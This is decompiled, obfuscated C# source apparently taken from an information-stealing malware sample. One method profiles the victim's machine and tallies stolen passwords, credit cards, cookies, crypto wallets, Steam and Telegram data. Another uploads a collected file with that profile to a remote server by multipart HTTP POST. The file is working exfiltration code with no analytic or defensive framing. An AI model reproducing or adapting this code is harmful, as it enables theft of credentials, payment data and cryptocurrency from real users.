using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.Win32;
using ns14;
using ns29;
using ns35;
using ns37;
using ns38;
using ns39;

namespace ns40
{
	// Token: 0x0200003E RID: 62
	internal class Class27
	{
		// Token: 0x06000219 RID: 537 RVA: 0x0001076C File Offset: 0x0000E96C
		public static void smethod_0()
		{
			if (Directory.Exists(GClass9.string_6 + "\\Wallets"))
			{
				GClass9.list_0.Add("[✅] Crypto");
			}
			string value;
			if (Environment.Is64BitOperatingSystem)
			{
				value = "x64";
			}
			else
			{
				value = "x32";
			}
			string value2 = Class23.smethod_2();
			string value3 = Class27.smethod_2("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
			string value4 = "0";
			string value5 = Convert.ToString(Class21.int_0);
			string value6 = Class25.int_0.ToString();
			string value7 = "0";
			string value8 = Convert.ToString(Class15.int_0);
			string value9 = "0";
			string value10 = "0";
			Convert.ToString(Class26.int_0);
			if (Directory.Exists(GClass9.string_6 + "\\Wallets"))
			{
				value10 = new DirectoryInfo(GClass9.string_6 + "\\Wallets").GetDirectories().Length.ToString();
			}
			if (Directory.Exists(GClass9.string_6 + "\\Steam"))
			{
				value9 = "1";
			}
			if (Directory.Exists(GClass9.string_6 + "\\Telegram"))
			{
				value7 = "1";
			}
			if (Directory.Exists(GClass9.string_6 + "\\Desktop"))
			{
				new DirectoryInfo(GClass9.string_6 + "\\Desktop").GetFiles().Length.ToString();
			}
			Class27.nameValueCollection_0.Add("hwid", value2);
			Class27.nameValueCollection_0.Add("os", value3);
			Class27.nameValueCollection_0.Add("platform", value);
			Class27.nameValueCollection_0.Add("profile", value4);
			Class27.nameValueCollection_0.Add("user", Environment.UserName);
			Class27.nameValueCollection_0.Add("passwordsCount", value5);
			Class27.nameValueCollection_0.Add("cccount", value6);
			Class27.nameValueCollection_0.Add("ccount", value10);
			Class27.nameValueCollection_0.Add("fcount", "null");
			Class27.nameValueCollection_0.Add("telegram", value7);
			Class27.nameValueCollection_0.Add("cookies", value8);
			Class27.nameValueCollection_0.Add("steam", value9);
		}

		// Token: 0x0600021A RID: 538 RVA: 0x00010994 File Offset: 0x0000EB94
		public static void smethod_1(string string_0, string string_1, string string_2, string string_3, NameValueCollection nameValueCollection_1)
		{
			string str = "---------------------------" + DateTime.Now.Ticks.ToString("x");
			byte[] bytes = Encoding.ASCII.GetBytes("\r\n--" + str + "\r\n");
			byte[] bytes2 = Encoding.ASCII.GetBytes("--" + str + "\r\n");
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
			httpWebRequest.Method = "POST";
			httpWebRequest.KeepAlive = true;
			httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
			httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("Accepts-Language", "en-us,en;q=0.5");
			httpWebRequest.Headers.Add(nameValueCollection);
			httpWebRequest.ContentType = "multipart/form-data; boundary=" + str;
			Stream requestStream = httpWebRequest.GetRequestStream();
			bool flag = true;
			string format = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
			foreach (object obj in nameValueCollection_1.Keys)
			{
				string text = (string)obj;
				if (flag)
				{
					requestStream.Write(bytes2, 0, bytes2.Length);
					flag = false;
				}
				else
				{
					requestStream.Write(bytes, 0, bytes.Length);
				}
				string s = string.Format(format, text, nameValueCollection_1[text]);
				byte[] bytes3 = Encoding.UTF8.GetBytes(s);
				requestStream.Write(bytes3, 0, bytes3.Length);
			}
			requestStream.Write(bytes, 0, bytes.Length);
			string s2 = string.Format("Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n", string_2, new FileInfo(string_1).Name, string_3);
			byte[] bytes4 = Encoding.UTF8.GetBytes(s2);
			requestStream.Write(bytes4, 0, bytes4.Length);
			FileStream fileStream = new FileStream(string_1, FileMode.Open, FileAccess.Read);
			byte[] array = new byte[4096];
			int count;
			while ((count = fileStream.Read(array, 0, array.Length)) != 0)
			{
				requestStream.Write(array, 0, count);
			}
			fileStream.Close();
			byte[] bytes5 = Encoding.ASCII.GetBytes("\r\n--" + str + "--\r\n");
			requestStream.Write(bytes5, 0, bytes5.Length);
			requestStream.Close();
			WebResponse webResponse = null;
			try
			{
				webResponse = httpWebRequest.GetResponse();
				new StreamReader(webResponse.GetResponseStream());
			}
			catch (Exception)
			{
				if (webResponse != null)
				{
					webResponse.Close();
					webResponse = null;
				}
			}
			finally
			{
				httpWebRequest = null;
			}
		}

		// Token: 0x0600021D RID: 541 RVA: 0x00010C4C File Offset: 0x0000EE4C
		[CompilerGenerated]
		internal static string smethod_2(string string_0, string string_1)
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0);
				if (registryKey == null)
				{
					result = "";
				}
				else
				{
					result = (string)registryKey.GetValue(string_1);
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x040000EA RID: 234
		public static NameValueCollection nameValueCollection_0 = new NameValueCollection();
	}
}
